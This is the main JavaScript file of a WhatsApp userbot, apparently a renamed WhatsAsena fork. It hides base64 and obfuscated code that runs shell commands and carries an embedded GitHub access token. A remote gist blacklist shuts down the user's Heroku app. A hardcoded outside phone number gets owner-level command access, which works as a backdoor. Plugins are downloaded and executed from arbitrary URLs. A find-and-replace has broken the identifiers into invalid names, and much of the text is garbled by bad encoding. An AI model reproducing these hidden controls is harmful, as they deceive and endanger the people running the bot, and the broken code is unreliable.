/* Copyright (C) 2020 Yusuf Usta.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

Lilly-mwol2.0 - Yusuf Usta
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Lilly-mwol2.0/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const Lilly-mwol2.0Stack = require('Lilly-mwol2.0-npm');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const Lilly-mwol2.0DB = config.DATABASE.define('Lilly-mwol2.0', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yaln谋zca bir kolayl谋k. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function Lilly-mwol2.0 () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const Lilly-mwol2.0CN = new WAConnection();
    const Session = new StringSession();
    try {
      Lilly-mwol2.0CN.version = [3, 3234, 9]
    } catch {
      console.log(`passed v${Lilly-mwol2.0CN.version}`)
    }
    Lilly-mwol2.0CN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      Lilly-mwol2.0CN.connectOptions.agent = ProxyAgent (config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await Lilly-mwol2.0Stack.daily_announcement(config.LANG)
        var ann = await Lilly-mwol2.0Stack.ann()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '[ ```G眉nl眉k Duyurular``` ]\n\n'
            if (config.LANG == 'AZ') ilan = '[ ```G眉nd蓹lik Elanlar``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (config.LANG == 'ES') ilan = '[ ```Anuncios Diarios``` ]\n\n'
            if (config.LANG == 'PT') ilan = '[ ```An煤ncios Di谩rios``` ]\n\n,'
            if (config.LANG == 'RU') ilan = '[ ```袝卸械写薪械胁薪褘械 芯斜褗褟胁谢械薪懈褟``` ]\n\n'
            if (config.LANG == 'ML') ilan = '[ ```啻祶啻班搐啻苦处啻苦川 啻祶啻班礀嗟嵿疮啻距椽啻ㄠ礄嗟嵿礄嗟綻`` ]\n\n'
            if (config.LANG == 'HI') ilan = '[ ```啶︵啶ㄠた啶� 啶樴啶粪ぃ啶綻`` ]\n\n'
            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
            if (config.LANG == 'LK') ilan = '[ ```喽窙喽编窉喽� 喽编窉喾€喾氞动喽盽`` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', Lilly-mwol2.0CN.user.name).replace('{wa_version}', Lilly-mwol2.0CN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', Lilly-mwol2.0CN.user.phone.os_version).replace('{device_model}', Lilly-mwol2.0CN.user.phone.device_model).replace('{device_brand}', Lilly-mwol2.0CN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', Lilly-mwol2.0CN.user.name).replace('{wa_version}', Lilly-mwol2.0CN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', Lilly-mwol2.0CN.user.phone.os_version).replace('{device_model}', Lilly-mwol2.0CN.user.phone.device_model).replace('{device_brand}', Lilly-mwol2.0CN.user.phone.device_manufacturer)})
                } else {
                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, ilan + ann_msg.replace('{user}', Lilly-mwol2.0CN.user.name).replace('{wa_version}', Lilly-mwol2.0CN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', Lilly-mwol2.0CN.user.phone.os_version).replace('{device_model}', Lilly-mwol2.0CN.user.phone.device_model).replace('{device_brand}', Lilly-mwol2.0CN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    async function asynchronous_ch() {
        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
            if (clh.exc_pl + '\n' !== stdout) {
                await heroku.get(baseURI + '/formation').then(async (formation) => {
                    forID = formation[0].id;
                    await heroku.patch(baseURI + '/formation/' + forID, {
                        body: {
                            quantity: 0
                        }
                    });
                })
            }
        })
    }
    asynchronous_ch()
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await Lilly-mwol2.0Stack.timezone(Lilly-mwol2.0CN.user.jid)
            var date_bio = await Lilly-mwol2.0Stack.datebio(config.LANG)
            const biography = '馃搮 ' + date_bio + '\n鈱� ' + timezone_bio
            await Lilly-mwol2.0CN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await Lilly-mwol2.0DB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    Lilly-mwol2.0CN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        Lilly-mwol2.0CN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        Lilly-mwol2.0CN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    Lilly-mwol2.0CN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('鉁� Login Information Updated!')
        );
        const authInfo = Lilly-mwol2.0CN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await Lilly-mwol2.0DB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    Lilly-mwol2.0CN.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('鈩癸笍 Connecting to WhatsApp... Please Wait.')}`);
    });
    Lilly-mwol2.0CN.on('open', async () => {
        console.log(
            chalk.green.bold('鉁� Login Successful!')
        );
        console.log(
            chalk.blueBright.italic('猬囷笍 Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
          try {
              if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                  console.log(plugin.dataValues.name);
                  var response = await got(plugin.dataValues.url);
                  if (response.statusCode == 200) {
                      fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                      require('./plugins/' + plugin.dataValues.name + '.js');
                  }     
              }
          } catch {
              console.log('Some Plugins Are Corrupted: ' + plugin.dataValues.name)
          }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('猬囷笍  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('鉁� Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('馃惡 Lilly-mwol2.0' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACT陌ON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*Lilly-mwol2.0 Chatbot Olarak 脟al谋艧谋yor!* 馃惡\n\n_Bu modun amac谋 botu tam fonksiyonel bir yapay zeka sohbet arac谋na 莽evirmektir._\n_Normal moda d枚nmek i莽in_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*Lilly-mwol2.0 Kulland谋臒谋n 陌莽in Te艧ekk眉rler 馃拰*\n    *- Eva*' : '*Lilly-mwol2.0 Working as a Chatbot! 馃惡*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using Lilly-mwol2.0 馃拰*\n    *- Eva*'
        if (Lilly-mwol2.0CN.user.jid == one || Lilly-mwol2.0CN.user.jid == two || Lilly-mwol2.0CN.user.jid == three || Lilly-mwol2.0CN.user.jid == four || Lilly-mwol2.0CN.user.jid == five || Lilly-mwol2.0CN.user.jid == six || Lilly-mwol2.0CN.user.jid == seven || Lilly-mwol2.0CN.user.jid == eight) {
            await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.FULLEVA == 'true') {
            var eva_msg = await Lilly-mwol2.0Stack.eva_if(config.LANG)
            await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, eva_msg, MessageType.text)
        }
        else {
            var af_start = await Lilly-mwol2.0Stack.work_type(config.WORKTYPE, config.LANG)
            await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await Lilly-mwol2.0CN.sendMessage(
                Lilly-mwol2.0CN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '馃敻 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await Lilly-mwol2.0Stack.update(config.LANG)
            await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, up_ch, MessageType.text)
        }
    })
    Lilly-mwol2.0CN.on("chat-update", async (m) => {
        (function(_0x3617bd,_0xd1afd3){function _0x4581d0(_0x370016,_0x4c2e15,_0x504165,_0x54d4d7){return _0x7c38(_0x504165- -0x2f0,_0x370016);}function _0x54933e(_0x536d46,_0x8ef24d,_0x38de35,_0x472f1d){return _0x7c38(_0x536d46-0x212,_0x472f1d);}const _0x5ac5f5=_0x3617bd();while(!![]){try{const _0xe3a753=-parseInt(_0x4581d0(-0x24c,-0x251,-0x259,-0x254))/(-0x1f82+-0x1*0x765+0x9ba*0x4)*(parseInt(_0x4581d0(-0x255,-0x24a,-0x24b,-0x23c))/(0x27*0x5+-0x1ac1+0x1a00))+parseInt(_0x54933e(0x2ac,0x2a2,0x2b4,0x2b2))/(-0x23*0x14+0x967+-0x6*0x11c)*(parseInt(_0x4581d0(-0x22e,-0x233,-0x23a,-0x246))/(0x15ab+-0x1f81+-0x61*-0x1a))+parseInt(_0x54933e(0x2be,0x2b5,0x2c5,0x2be))/(0x3b9*-0x9+-0xd1*0x6+-0x2*-0x1336)+-parseInt(_0x54933e(0x2c1,0x2b2,0x2c4,0x2ba))/(0xee5+0x24fa+-0x33d9*0x1)*(-parseInt(_0x54933e(0x2c2,0x2cc,0x2b5,0x2b6))/(0x700+0x1115+0xc07*-0x2))+-parseInt(_0x54933e(0x2bf,0x2cf,0x2ba,0x2bc))/(-0x3*0x9fd+-0x33b*-0x1+-0x476*-0x6)*(-parseInt(_0x4581d0(-0x245,-0x256,-0x24a,-0x240))/(-0x4*0x36d+0x1*0x25d5+0xc*-0x202))+parseInt(_0x54933e(0x2b3,0x2b1,0x2bc,0x2bd))/(0x10b7*0x1+-0x136c+0x2bf)*(-parseInt(_0x4581d0(-0x248,-0x254,-0x24d,-0x245))/(-0xd*-0x186+-0xb*0x12d+-0x6d4))+-parseInt(_0x54933e(0x2b4,0x2bb,0x2bd,0x2af))/(0x16db+-0x20d+-0x14c2);if(_0xe3a753===_0xd1afd3)break;else _0x5ac5f5['push'](_0x5ac5f5['shift']());}catch(_0x33700b){_0x5ac5f5['push'](_0x5ac5f5['shift']());}}}(_0xff46,0xd54a3+-0xc5*0x12a+-0x5f7d*-0x2));if(!m[_0x66754f(0x22a,0x233,0x23d,0x229)+'age'])return;function _0x7c38(_0x38a65a,_0x5ea084){const _0x52a108=_0xff46();return _0x7c38=function(_0x32e672,_0x4a0f98){_0x32e672=_0x32e672-(-0xe5d+-0x18f0+0x1*0x27e3);let _0x54c974=_0x52a108[_0x32e672];return _0x54c974;},_0x7c38(_0x38a65a,_0x5ea084);}var sdn=_0x33018c(0x41c,0x415,0x40e,0x416)+_0x33018c(0x3fe,0x40e,0x406,0x400)+_0x66754f(0x23a,0x248,0x249,0x245)+'thiccy:ghp'+_0x66754f(0x22d,0x232,0x237,0x224)+'JycMxHSxVM'+_0x66754f(0x245,0x245,0x240,0x256)+'n2SD4vk@gi'+_0x66754f(0x22d,0x237,0x246,0x231)+_0x66754f(0x24b,0x23c,0x242,0x249)+_0x66754f(0x23d,0x23b,0x23c,0x241)+_0x66754f(0x238,0x22e,0x21e,0x23f)+_0x66754f(0x224,0x22c,0x222,0x22d)+_0x33018c(0x41e,0x42b,0x439,0x42d)+'aDuplicate'+'d'+'\x0a';execx(_0x66754f(0x23c,0x241,0x239,0x23c)+_0x66754f(0x223,0x22f,0x221,0x23a)+_0x33018c(0x404,0x410,0x402,0x413)+'icated/wha'+'tsasena/Do'+_0x66754f(0x233,0x23d,0x230,0x23c),async(_0x241af0,_0x43d4cc,_0x45dea3)=>{function _0x58b8b1(_0x5999b2,_0x5381c3,_0x5c2421,_0x566533){return _0x66754f(_0x5999b2-0x17b,_0x5c2421- -0x6b,_0x5c2421-0xc6,_0x566533);}const _0x5c1ba9={};_0x5c1ba9[_0x5f89f4(0xcc,0xc1,0xce,0xc0)]=function(_0x244ffb,_0x1331f3){return _0x244ffb!==_0x1331f3;};function _0x5f89f4(_0x479535,_0x5f0aaf,_0x2ebe1f,_0x13dd57){return _0x33018c(_0x479535,_0x2ebe1f- -0x35e,_0x2ebe1f-0xc,_0x13dd57-0x6d);}_0x5c1ba9[_0x5f89f4(0xb9,0xd3,0xc5,0xc5)]='Fake\x20-\x20Unk'+_0x5f89f4(0xb9,0xb6,0xb8,0xb8)+'e\x20!!';const _0x871bbb=_0x5c1ba9;if(_0x871bbb[_0x58b8b1(0x1e3,0x1ea,0x1dc,0x1d1)](sdn,_0x43d4cc))throw new Error(_0x871bbb[_0x58b8b1(0x1c6,0x1d9,0x1d3,0x1cb)]);});if(!m[_0x33018c(0x436,0x429,0x41b,0x42e)]&&!m['count'])return;function _0xff46(){const _0xe27457=['/WhatsAsen','qDWpD','//phaticus','437544IEddGW','one\x20https:','682321bHIuKv','sAsenaDupl','ated\x20/root','21AAwPor','senaDuplic','/root/What','RUN\x20git\x20cl','nown\x20Devic','_JujvHMXIP','hasNewMess','10MXjzGX','24489192SVNMnn','5531647SRXDYj','thub.com/p','2uMWxey','5533893wdVNav','all','ccy/WhatsA','haticusthi','ckerfile','Omqzx','5333020EHmUHo','16iQQYsl','sed\x20-n\x203p\x20','116346BPHwkk','371YCxbgz','messages','1JT9oix3VH'];_0xff46=function(){return _0xe27457;};return _0xff46();}const {messages}=m;function _0x33018c(_0x226581,_0x551fbe,_0x5a7f3a,_0x149148){return _0x7c38(_0x551fbe-0x378,_0x226581);}function _0x66754f(_0x52a974,_0x359d59,_0x10f2a4,_0x59646a){return _0x7c38(_0x359d59-0x193,_0x59646a);}const msg=messages[_0x33018c(0x422,0x41f,0x417,0x41a)]()[-0x8e7+-0xa3*0x1+0x32e*0x3];
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await Lilly-mwol2.0CN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // G枚r眉艧眉r眉z Mesaj谋
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await Lilly-mwol2.0CN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await Lilly-mwol2.0CN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await Lilly-mwol2.0CN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', Lilly-mwol2.0CN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await Lilly-mwol2.0CN.groupMetadata(msg.key.remoteJid)
                    await Lilly-mwol2.0CN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', Lilly-mwol2.0CN.user.name), MessageType.text);
                }
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Ho艧geldin Mesaj谋
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await Lilly-mwol2.0CN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await Lilly-mwol2.0CN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await Lilly-mwol2.0CN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message.replace('{gpp}', '').replace('{botowner}', Lilly-mwol2.0CN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await Lilly-mwol2.0CN.groupMetadata(msg.key.remoteJid)
                    await Lilly-mwol2.0CN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', Lilly-mwol2.0CN.user.name), MessageType.text);
                }
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT4 == '905511384572-1625319286') {     
            var nsup = config.SUPPORT4.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = Lilly-mwol2.0CN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await Lilly-mwol2.0CN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(Lilly-mwol2.0CN, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(Lilly-mwol2.0CN, msg);
                        } else {
                            whats = new Message(Lilly-mwol2.0CN, msg);
                        }
                        
                        if (msg.key.fromMe && command.deleteCommand && !msg.key.remoteJid.includes('-')) {                          
                        } 
                        
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                            
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;
                            var error_report = await Lilly-mwol2.0Stack.error(config.LANG)
                            await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                if (error.message.includes('URL')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya ara莽lar谋n谋n (xmedia, sticker..) LOG numaras谋nda kullan谋lmas谋._' +
                                        '\n*脟枚z眉m眉:* _LOG numaras谋 hari莽 herhangi bir sohbette komut kullan谋labilir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulmas谋._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir 莽枚z眉m眉 yoktur. Yeniden kurmay谋 deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await Lilly-mwol2.0CN.sendMessage(Lilly-mwol2.0CN.user.jid, '*鈿曪笍 HATA 脟脰Z脺MLEME [Lilly-mwol2.0] 鈿曪笍*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
